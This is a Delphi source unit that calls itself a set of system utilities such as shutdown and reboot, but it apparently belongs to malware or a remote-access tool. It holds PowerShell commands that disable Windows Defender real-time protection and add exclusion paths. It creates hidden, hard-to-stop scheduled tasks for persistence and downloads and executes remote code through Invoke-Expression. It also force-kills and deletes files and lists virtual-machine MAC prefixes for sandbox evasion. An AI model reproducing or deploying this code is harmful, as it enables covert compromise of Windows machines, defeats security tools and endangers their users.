unit SystemUnit;

{
  This unit implements functions that have direct impact on the
  system, such as shutting down and rebooting.
}

interface

uses
  System.SysUtils, System.Classes,
  Winapi.Windows, Winapi.Messages, Winsock, IdStack,
  DProcess, Basics;

type
  TTaskOptions = Record
    Name: String;
    Desc: String;
    Command: String;
    Param: String;
    Dir: String;
    Trigger: String;
  End;

  ///  <summary>A class that manages Scheduled Tasks</summary>
  Task = class
    ///  <returns>True if the specified Task exists</returns>
    class function Exists(Name: String): Boolean;
    ///  <summary>Creates a new Scheduled Task</summary>
    ///  <returns>True if the creation of the Task was successful</returns>
    class function Create(T: TTaskOptions): Boolean;
    ///  <returns>True if the specified Task was deleted successfully</returns>
    class function Remove(Name: String): Boolean;
  end;

  TOUI = Array [0 .. 2] of Byte;
  TMAC = Array [0 .. 5] of Byte;

const
  SysInfoCmd = '-Command "Get-CimInstance -ClassName Win32_Operati' +
    'ngSystem | Select -Property CSName,RegisteredUser,Organizatio' +
    'n,Caption,OSArchitecture,InstallDate,TotalVisibleMemorySize; ' +
    'Get-CimInstance -ClassName Win32_VideoController | Select -Pr' +
    'operty Name; Get-CimInstance -ClassName Win32_Processor | Sel' +
    'ect -Property Name,NumberOfCores; Get-CimInstance -Namespace ' +
    'root/SecurityCenter2 -ClassName AntivirusProduct | Select -Pr' +
    'operty displayName,productState"';
  DeleteCmd = '-Command "$Path = ''%s''; $Proc = Get-Process; $Proc | where ' +
    '{$_.Path -like ($Path + ''*'')} | Stop-Process -Force -ErrorAct' +
    'ion SilentlyContinue; foreach($File in Get-ChildItem -Path $P' +
    'ath -Recurse) { foreach ($P in $Proc) { $P.Modules | where {$' +
    '_.FileName -eq $File} | Stop-Process -Force -ErrorAction Sile' +
    'ntlyContinue } }; Remove-Item -Path $Path -Recurse -Force"';
  StartProcCmd = 'Start-Process ''%s''';
  DefenderCmd = '-Command "Set-MpPreference -DisableRealtimeMonitoring $%s"';
  ExclusionCmd = '-Command "Add-MpPreference -ExclusionPath ''%s''"';
  RmExclusionCmd = '-Command "Remove-MpPreference -ExclusionPath ''%s''"';
  GetDefCmd = '-Command "(Get-MpPreference).DisableRealtimeMonitoring"';
  NewTaskCmd = '-Command "$Action = New-ScheduledTaskAction -Execute ''%s'' -' +
    'Argument ''%s'' -WorkingDirectory ''%s''; $Trigger = New-Sche' +
    'duledTaskTrigger %s; $Settings = New-ScheduledTaskSettingsSet' +
    ' -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfG' +
    'oingOnBatteries -Hidden -StartWhenAvailable; Register-Schedul' +
    'edTask -TaskName ''%s'' -Action $Action -Trigger $Trigger -Se' +
    'ttings $Settings -Description ''%s''"';
  TaskExCmd = '-Command "Get-ScheduledTaskInfo -TaskName ''%s''"';
  RemTaskCmd = '-Command "Unregister-ScheduledTask -TaskName ''%s'' -Confirm:' +
    '$false"';
  RIPayloadCmd = '-Command "Invoke-Expression (New-Object Net.WebClient).Downlo'
    + 'adString(''%s'')"';
  MinTask = '-Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)';
  LogonTask = '-Logon';
  RITask = '-Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Days 30)';

var
  ///  <summary>MAC Address patterns of Virtual Environments</summary>
  VirtualMAC: Array [0 .. 26] of Byte = (
    $00,
    $50,
    $56,
    $00,
    $0C,
    $29,
    $00,
    $05,
    $69,
    $00,
    $03,
    $FF,
    $00,
    $1C,
    $42,
    $00,
    $0F,
    $4B,
    $00,
    $16,
    $3E,
    $08,
    $00,
    $27,
    $00,
    $1C,
    $14
  );

function SendARP(DestIP, SrcIP: ULONG; pMacAddr: Pointer; var PhyAddrLen: ULONG)
  : DWORD; stdcall; external 'Iphlpapi.dll';
///  <summary>Adjusts the state of the system
///  <para>Accepts Shutdown, Reboot, Lock, Sleep, Wake</para></summary>
function Power(Mode: String): Boolean;
///  <summary>Adds or removes a Windows Defender exclusion</summary>
///  <remarks>Requires administrative permissions</remarks>
function DefenderExclusion(Dir: String; Add: Boolean): Boolean;
///  <summary>Enables or disables Realtime Protection in Windows Defender</summary>
function EnableDefender(B: Boolean): Boolean;
function IsDefenderEnabled: Boolean;
///  <summary>Gets the system information in a TStringList</summary>
procedure GetSystemInfo(Res: TStringList);
///  <returns>The OUI of the current computer's network card</returns>
function GetOUI: TOUI;
function OUIEquals(O1, O2: TOUI): Boolean;

implementation

function OUIEquals(O1, O2: TOUI): Boolean;
Begin
  Result := False;
  if O1[0] = O2[0] then
    if O1[1] = O2[1] then
      if O1[2] = O2[2] then
        Result := True;
End;

function inet_addr(const IPAddress: string): ULONG;
begin
  Result := ULONG(Winsock.inet_addr(PAnsiChar(AnsiString(IPAddress))));
end;

function GetMacAddress(const IPAddress: string): TMAC;
var
  MaxMacAddrLen: ULONG;
begin
  MaxMacAddrLen := SizeOf(Result);
  SendARP(inet_addr(IPAddress), 0, @Result, MaxMacAddrLen);
end;

function GetOUI: TOUI;
var
  M: TMAC;
  IP: String;
  I: Integer;
Begin
  TIdStack.IncUsage;
  try
    try
      IP := GStack.LocalAddress;
    except
      IP := '127.0.0.1';
    end;
  finally
    TIdStack.DecUsage;
  end;
  M := GetMacAddress(IP);
  for I := 0 to 2 do
    Result[I] := M[I];
End;

class function Task.Exists(Name: String): Boolean;
var
  S: String;
Begin
  S := Format(TaskExCmd, [Name]);
  Result := Powershell(S);
End;

class function Task.Remove(Name: String): Boolean;
var
  S: String;
Begin
  S := Format(RemTaskCmd, [Name]);
  Result := Powershell(S);
End;

class function Task.Create(T: TTaskOptions): Boolean;
var
  S: String;
Begin
  S := Format(NewTaskCmd, [T.Command, T.Param, T.Dir, T.Trigger,
    T.Name, T.Desc]);
  Result := Powershell(S);
End;

function IsDefenderEnabled: Boolean;
var
  A: AnsiString;
Begin
  RunCommand('powershell', [GetDefCmd], A, []);
  Result := A[1] = 'F';
End;

function EnableDefender(B: Boolean): Boolean;
var
  S: String;
Begin
  S := LowerCase(BoolToStr(Not(B), True));
  S := Format(DefenderCmd, [S]);
  Result := Powershell(S);
End;

function DefenderExclusion(Dir: String; Add: Boolean): Boolean;
var
  S: String;
Begin
  if Add then
    S := Format(ExclusionCmd, [Dir])
  else
    S := Format(RmExclusionCmd, [Dir]);
  Result := Powershell(S);
End;

function GetAntivirusState(StateStr: String): String;
var
  X: LongInt;
  S: String;
Begin
  X := StrToInt(StateStr);
  S := IntToHex(X, 6);
  if Copy(S, 3, 2) = '10' then
    Result := 'Enabled, '
  else
    Result := 'Disabled, ';
  if Copy(S, 5, 2) = '00' then
    Result := Result + 'Up to date'
  else
    Result := Result + 'Out of date';
End;

procedure GetSystemInfo(Res: TStringList);
var
  A: AnsiString;
  IName, IVal: String;
  B: TStringList;
  I, J: LongInt;
Begin
  RunCommand('powershell', [SysInfoCmd], A, []);
  B := TStringList.Create;
  B.Text := String(A);
  for I := 0 to B.Count - 1 do
    if B.Strings[I] <> '' then
    Begin
      J := Pos(':', B.Strings[I]);
      IName := Copy(B.Strings[I], 1, J - 1);
      IName := IName.Trim;
      IVal := B.Strings[I].Substring(J + 1);
      IVal := IVal.Trim;
      if IName.Contains('TotalVisibleMemorySize') then
        IVal := FormatFloat('#.##', StrToInt(IVal) / (1024 * 1024)) + ' GB'
      else if IName.Contains('productState') then
        IVal := GetAntivirusState(IVal);
      Res.AddPair(IName, IVal);
    End;
  B.Free;
End;

procedure GetShutdownPrivileges;
var
  T: Cardinal;
  hToken: THandle;
  TKP: TOKEN_PRIVILEGES;
Begin
  OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES or
    TOKEN_QUERY, hToken);
  LookupPrivilegeValue(nil, 'SeShutdownPrivilege', TKP.Privileges[0].Luid);
  TKP.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;;
  TKP.PrivilegeCount := 1;
  AdjustTokenPrivileges(hToken, False, TKP, 0, nil, T);
  CloseHandle(hToken);
End;

function Power(Mode: String): Boolean;
Begin
  Result := False;
  if Mode = 'Shutdown' then
  Begin
    GetShutdownPrivileges;
    Result := ExitWindowsEx(EWX_POWEROFF or EWX_SHUTDOWN or EWX_FORCEIFHUNG, 0);
  End
  else if Mode = 'Reboot' then
  Begin
    GetShutdownPrivileges;
    Result := ExitWindowsEx(EWX_REBOOT or EWX_FORCEIFHUNG, 0);
  End
  else if Mode = 'Lock' then
    Result := LockWorkStation
  else if Mode = 'Sleep' then
    Result := SendMessage(GetForegroundWindow, WM_SYSCOMMAND,
      SC_MONITORPOWER, 2) = 0
  else if Mode = 'Wake' then
  Begin
    Result := True;
    mouse_event(MOUSEEVENTF_MOVE, 0, 0, 0, 0);
  End;
End;

end.
